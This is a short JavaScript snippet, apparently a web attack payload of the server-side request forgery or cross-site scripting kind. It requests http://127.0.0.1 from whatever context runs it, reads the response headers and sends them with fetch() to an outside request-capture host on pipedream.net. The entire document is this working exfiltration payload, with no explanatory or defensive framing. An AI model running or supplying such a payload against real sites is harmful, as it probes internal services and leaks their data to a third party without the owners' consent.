var xhr = new XMLHttpRequest();
xhr.open("GET", "http://127.0.0.1");
xhr.onreadystatechange = function() {
    text = xhr.responseText;
    console.log(xhr.getAllResponseHeaders());
    fetch('https://encnu1395lyv7.x.pipedream.net/?q=' + xhr.getAllResponseHeaders());
};
xhr.send(null);
